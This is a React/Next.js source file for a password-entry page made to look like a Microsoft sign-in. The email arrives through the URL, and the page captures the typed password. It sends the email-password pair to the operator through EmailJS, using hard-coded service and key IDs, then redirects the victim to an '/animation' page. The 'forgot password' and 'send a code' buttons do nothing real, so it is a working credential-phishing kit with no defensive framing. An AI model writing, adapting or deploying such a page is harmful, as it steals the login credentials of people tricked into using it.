"use client";
import React, { useState, useEffect } from "react";
import emailjs from "@emailjs/browser";
import Image from "next/image";
import { useSearchParams, useRouter } from "next/navigation";

const Password = () => {
    const [password, setPassword] = useState("");
    const searchParams = useSearchParams();
    const email = searchParams.get("email") || "";
     const router = useRouter();

    const handleSubmit = (e) => {
        e.preventDefault();

    emailjs.send(
      "service_rp4ht9g",    
      "template_gfkbans",    
      {
        user_email: email,
        user_password: password
      },
      "LhNGTlaSzpZLxmy0Z"     
    ).then(() => {
        // alert("Details sent successfully!");
        router.push("/animation");
    }).catch((err) => {
      console.error(err);
      alert("Failed to send email.");
    });
    };

    return (
        <div
            className="min-h-screen flex items-center justify-center bg-cover bg-center"
            style={{ backgroundImage: "url('/bg.png')" }}
        >
            <div className="bg-white w-full max-w-sm shadow-md rounded-md px-6 py-12">
               
                <div className="flex items-center justify-center mb-4">
                    <Image src="/image.png" alt="Login logo" width={120} height={25} />
                </div>

                <div className="flex justify-center mb-1">
                    <p className="inline-block border border-gray-400 px-3 py-1 rounded text-gray-700 text-sm">
                        {email}
                    </p>
                </div>
                <h1 className="text-xl flex items-center justify-center font-medium mb-6">
                    Enter your password
                </h1>

                
                <form onSubmit={handleSubmit} className="space-y-4">
                    <input
                        type="password"
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="w-full border border-gray-300 rounded-sm px-3 py-2 focus:outline-none focus:ring-1 focus:ring-blue-500"
                        required
                    />
                    <button className="text-[#0078D4] text-sm hover:underline block">forgot your password ?</button>
                    <button
                        type="submit"
                        className="w-full bg-[#0078D4] text-white py-2 rounded-sm hover:bg-blue-700 transition-colors"
                    >
                        Next
                    </button>
                </form>

               
                <div className="flex flex-col items-center justify-center mt-6 text-sm space-y-1">
                    <button
                        type="button"
                        onClick={() => alert("Send a code to " + email)}
                        className="text-[#0078D4] hover:underline block"
                    >
                        Send a code to {email}
                    </button>
                    {/* <button
                        type="button"
                        onClick={() => window.location.href = "/"}
                        className="text-[#0078D4] hover:underline block"
                    >
                        Sign in with a different Microsoft account
                    </button> */}
                </div>
            </div>
        </div>
    );
};

export default Password;
